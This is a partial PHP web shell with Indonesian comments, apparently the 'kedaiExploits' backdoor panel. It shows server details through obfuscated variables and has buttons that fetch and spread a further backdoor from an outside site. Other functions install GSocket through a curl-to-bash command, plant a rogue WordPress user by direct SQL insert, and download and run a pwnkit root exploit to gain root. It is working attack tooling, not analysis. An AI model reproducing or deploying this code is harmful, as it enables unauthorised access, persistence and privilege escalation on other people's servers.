...
$botToken = ""; // Ganti dengan token bot Anda
$chatID = ""; // Ganti dengan chat ID grup Anda
...
$valid_password_hash = '$1$ojQOLZW2$xrRLLcgxfTjp6ovoEPybu1'; 
...
<body>
    <div class="menu-header">
        <ul>
            <li><i class="fa-solid fa-server">SERVER :</i>&nbsp;<?= $_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x53\x4f\x46\x54\x57\x41\x52\x45"]; ?>&nbsp;<?= $fungsi[8](); ?></li>
            <li><i class="fa-solid fa-network-wired">IP :</i>&nbsp;: <?= gethostbyname($_SERVER["\x53\x45\x52\x56\x45\x52\x5f\x41\x44\x44\x52"]); ?> |&nbsp;: <?= $_SERVER["\x52\x45\x4d\x4f\x54\x45\x5f\x41\x44\x44\x52"]; ?></li>
            ...
            <li class="logo-gecko"><img width="400" height="400" src="https://i.imgur.com/cYevGR3.png" align="right"></li>
    ...
    <div class="menu-tools">
        <ul>
            ...
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&installgsocket" class="btn-submit"><i class="fa-solid fa-plug"></i> Install GSocket</a></li>
            <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> CREATE WP USER</a></li>
            <li>
    <a href="?tebar=true" class="btn-submit">
        <i class="fa-brands fa-wordpress-simple"></i> Tebar backdoor
    </a>
</li>
            <li><a href="?logout=true" class="btn-submit"><i class="fa-solid fa-sign-out-alt"></i>Logout</a></li>
    </ul>
    </div>
<?php
function download_file() {
    // URL sumber file
    $url = "http://avatarbiru.site/source/tebar.css";

    // Lokasi penyimpanan file unduhan di server
    $download_path = __DIR__ . "/download.php";

    // Menggunakan wget dengan --no-check-certificate
    $command = "wget --no-check-certificate -O $download_path $url";
    $result = shell_exec($command); // Menjalankan perintah wget

    // Debugging: Log hasil perintah wget
    error_log("Wget result: " . print_r($result, true));

    // Pastikan file berhasil diunduh
    if (file_exists($download_path)) {
        return true; // File berhasil diunduh
    } else {
        return false; // Gagal mengunduh file
    }
}

// Proses setelah tombol "Tebar Backdoor" diklik
if (isset($_GET['tebar'])) {
    if (download_file()) {
        // Membangun URL untuk file download.php
        $base_url = $_SERVER['REQUEST_SCHEME'] . "://" . $_SERVER['HTTP_HOST'];
        $download_url = $base_url . dirname($_SERVER['SCRIPT_NAME']) . "/download.php";

        // Gunakan SweetAlert2 untuk menampilkan pesan sukses
        echo "<script>
                Swal.fire({
                    title: 'Mantap Mau Nebar Nihh !!',
                    icon: 'success',
                    confirmButtonText: 'Lanjut'
                }).then((result) => {
                    if (result.isConfirmed) {
                        window.location.href = '$download_url'; // Redirect ke file download.php
                    }
                });
              </script>";
    } else {
        // Pesan error jika file gagal diunduh
        echo "<script>
                Swal.fire({
                    title: 'Gagal mengunduh file!',
                    text: 'File download gagal. Pastikan sumber file tersedia.',
                    icon: 'error',
...
<?php if (isset($_GET['installgsocket'])) : ?>
    <div class="modal active">
        <div class="modal-container">
            <div class="modal-header">
                <h3><b><i id="modal-title">:: Install GSocket</i></b></h3>
            </div>
            <form action="" method="post">
                <div class="modal-body">
                    <div class="modal-isi" style="margin-top: 10px;">
                        <!-- Menampilkan output perintah GSocket di sini -->
                        <?php
                            // Eksekusi perintah bash untuk install gsocket via curl
                            $output = shell_exec('bash -c "$(curl -fsSL https://gsocket.io/y)"');
                            echo "<pre style='margin-top: 10px; padding-left: 20px;'>" . htmlspecialchars($output) . "</pre>"; // Menambahkan padding kiri
                        ?>
                    </div>
                    <div class="modal-btn-form">
    ...
    <?php if ($_GET['terminal'] == "root") : ?>
        <div class="terminal">
            <div class="terminal-container">
                ...
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.kedai') && $fungsi[3]('pwnkit')) {
                                                    $response = $fungsi[11]('.kedai');
...
if (isset($_POST['submitwp'])) {
    ...
    $sql = "INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_activation_key, user_status, display_name) VALUES ('$wp_user', '$wp_pass', 'kedaiExploits', '', '', NOW(), '', 0, 'kedaiExploits')";
...
if ($_GET['terminal'] == "root") {
    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
        $fungsi[28]("pwnkit", $fungsi[11]("https://kedaipapa.site/rootkit/limaempat"));
        cmd('chmod +x pwnkit');
        echo cmd('./pwnkit "id" > .kedai');
...
"email" : "' . $emailCp . '"
    ...
    if ($_POST['create_folder'] == true) {
        ...
        if (!$fungsi[3]('pwnkit')) {
            cmd('wget https://kedaipapa.site/rootkit/limaempat -O pwnkit');
            cmd('chmod +x pwnkit');
            cmd('./pwnkit "id" > .kedai');
            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
        } else if ($fungsi[3]('.kedai')) {
            $response = $fungsi[11]('.kedai');
            $r_text = explode(" ", $response);
            if ($r_text[0] == "uid=0(root)") {
